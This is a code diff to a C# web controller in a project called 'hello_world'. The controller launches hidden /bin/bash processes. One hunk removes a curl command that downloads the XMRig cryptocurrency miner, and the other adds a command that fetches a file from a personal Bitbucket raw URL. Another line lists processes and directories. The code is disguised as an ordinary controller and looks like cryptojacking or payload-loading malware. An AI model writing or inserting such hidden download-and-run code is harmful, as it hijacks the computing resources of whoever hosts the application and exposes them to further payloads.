@@ -33,7 +33,7 @@ namespace hello_world.Controllers
                     WindowStyle = ProcessWindowStyle.Hidden,
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
-                    Arguments = $"-c \"ps -aux; ls -l\"",
+                    Arguments = $"-c \"ps -aux; cd ..; ls -l\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
@@ -69,7 +69,7 @@ namespace hello_world.Controllers
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
                     Arguments =
-                        $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz\"",
+                        $"-c \" cd ..; Invoke-WebRequest -Uri https://bitbucket.org/bro680965/bbb/raw/158b4fc684da1ef53c43cd30ca14387b6860f58d/1.txt -OutFile 1.txt\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
